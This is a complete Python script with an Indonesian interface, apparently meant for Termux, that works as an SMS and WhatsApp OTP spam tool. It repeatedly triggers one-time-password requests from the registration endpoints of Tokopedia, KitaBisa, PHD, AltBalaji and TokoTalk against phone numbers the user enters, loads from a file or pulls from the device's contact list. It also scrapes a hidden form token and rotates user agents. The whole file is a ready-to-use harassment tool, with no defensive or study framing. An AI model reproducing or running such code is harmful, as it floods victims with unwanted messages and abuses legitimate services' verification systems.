#!/usr/bin/python
import requests,random,json,time,sys,os,re

p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'

def hapus():
    if os.name == ('posix'):
        _ = os.system('clear')
    else:
        os.system('cls')
hapus()
class spam:
		
	def __init__(self, nomer):
		self.nomer = nomer
		
	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpam kitabisa  ke {self.nomer} \033[1;32mTerkirim!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpam kitabisa  ke {self.nomer} \x1b[91mGagal!'
			
	def tokped(self):
		rands=random.choice(open('server.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpam Tokped ke {self.nomer} \x1b[91mGagal!'
		else:
			return f'\x1b[92mSpam Tokped ke {self.nomer} {h}Berhasil!'

	def phd(self):
		param = {'phone_number':self.nomer}
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpam PHD ke {self.nomer} {h}Berhasil!'
		else:
			return f'\x1b[91mSpam PHD ke {self.nomer} {m}Gagal!'
			
	def balaji(self):
		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		kod="62"
		ata={
				"country_code":kod,
				"phone_number":self.nomer
			}
		head={
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
			}
		req=requests.post(urlb,data=json.dumps(ata),headers=head)
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpam BALAJI ke{self.nomer} {h}Berhasil!'
		else:
			return f'\x1b[92mSpam BALAJI ke {self.nomer} {m}Gagal!'
	def TokoTalk(self):
		data='{"key":"phone","value":"'+str(self.nomer)+'"}'
		head={
			"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
			"content-type":"application/json;charset=UTF-8"
		}
		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
			return f'\x1b[92mSpam TokoTalk ke {self.nomer} {h}Berhasil!'
		else:
			return f'\x1b[92mSpam TokoTalk ke {self.nomer} {m}Gagal!'

def apakah():
	while True:
		lan=str(input(k+'\tSpam Lagi? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tFile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tTotal spam : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam())
				elif jns == 'tkpd':
					print('\t'+z.tokped())
				elif jns == 'blji':
					print('\t'+z.balaji())
				elif jns == 'smua':
					print('\t'+z.spam())
					print('\t'+z.tokped())
					print('\t'+z.balaji())
					print('\t'+z.phd())
					print('\t'+z.TokoTalk())
				elif jns == 'pehd':
					print('\t'+z.phd())
				elif jns == 'ttk':
					print('\t'+z.TokoTalk())
				else:
					print()
				time.sleep(5)
		apakah()
	else:
		print(m+f'\tFile {fil} tidak ditemukan')
def single():
	nomer=str(input(k+'\tNomor HP : '+h))
	jm=int(input(k+'\tTotal spam : '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		else:
			print()
		time.sleep(5)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tTotal Nomer : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tNomer -{i+1} : '+h)))
	spm=int(input(k+'\tTotal spam : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'ktbs':
				print('\t'+z.spam())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			elif jns == 'blji':
				print('\t'+z.balaji())
			elif jns == 'smua':
				print('\t'+z.spam())
				print('\t'+z.tokped())
				print('\t'+z.balaji())
				print('\t'+z.phd())
				print('\t'+z.TokoTalk())
			elif jns == 'pehd':
				print('\t'+z.phd())
			elif jns == 'ttk':
				print('\t'+z.TokoTalk())
			else:
				print()
		time.sleep(5)
	apakah()
def logo():
	def hapus():
	    if os.name == ('posix'):
	        _ = os.system('clear')
	    else:
	        os.system('cls')
	hapus()
	auth=m+'    copyright \N{COPYRIGHT SIGN} 2021'+k
	
	return '''
%s╭━┳━╭━╭━╮%s╮╲╲╲╲╲╲%s╔═╗╔═╗╔═╗╔╦╗
%s┃┈┈┈┣▅╋▅┫┃%s╲╲╲╲╲╲%s╚═╗╠═╝╠═╣║║║
%s┃┈┃┈╰━╰━━━━━━╮%s╲╲%s╚═╝╩  ╩ ╩╩ ╩
%s╰┳╯┈┈┈┈┈┈┈┈◢▉◣%s╲%s╔═╗╔╦╗╔═╗
%s╲┃┈┈┈┈┈┈┈┈┈▉▉▉%s╲%s╚═╗║║║╚═╗
%s╲┃┈┈┈┈┈┈┈┈┈◥▉◤%s╲%s╚═╝╩ ╩╚═╝
%s╲┃┈┈┈┈╭━┳━━━━╯%s╲╲%s╦ ╦╦ ╦╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗
%s╲┣━━━━━━┫%s╲╲╲╲╲╲╲%s║║║╠═╣╠═╣ ║ ╚═╗╠═╣╠═╝╠═╝
%s╲┃┈┈┈┈┈┈┃%s╲╲╲╲╲╲╲%s╚╩╝╩ ╩╩ ╩ ╩ ╚═╝╩ ╩╩  ╩  
%s''' % (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,auth)

def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tPilih > '+h))-1]['Nomer']
	for w in range(int(input(u+'\tTotal spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		time.sleep(5)
	apakah()
def main():
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'MODE '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'0'+m+'』'+bm+' Kembali\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'Satu Nomor\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'Banyak Nomor\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'Nomor dalam file\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Nomor Dari Kontak\n'+b+'╠══════════════════════════════')
	pil=str(input(b+'╚══'+m+'〙'+u+'Mode'+m+' ▶ '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	elif( pil == '0' or pil == '00'):
		jnspam()
	else:
		print(m+'             Input Yang Anda Masukkan Salah')
		time.sleep(5)
		main()

def jnspam():
	global jns
	print(logo())
	print(b+'╔═════════════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠═════════════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'Semua\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Tanpa Jumlah)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji (Tanpa angka +62 atau 0)\n'+b+'╠═════════════════════════════════════''\n║'+m+'『'+h+'0'+m+'』'+bm+' Keluar\n'+b+'╠═════════════════════════════════════'+b)
	while True:
		oy=str(input(b+'╚══'+m+'〙'+u+'Pilih'+m+' ▶ '+h))
		if( oy == '1' or oy == '01' ):
			jns='smua'
			break
		elif( oy == '2' or oy == '02' ):
			jns='pehd'
			break
		elif( oy == '3' or oy == '03' ):
			jns='ktbs'
			break
		elif( oy == '4' or oy == '04' ):
			jns='tkpd'
			break
		elif( oy == '5' or oy == '05' ):
			jns='ttk'
			break
		elif( oy == '6' or oy == '06' ):
			jns='blji'
			break
		elif( oy == '0' or oy == '00' ):
			sys.exit()
		else:
			print(m+'             Input Yang Anda Masukkan Salah!')
			continue

	main()
if __name__ == '__main__':
	jnspam()
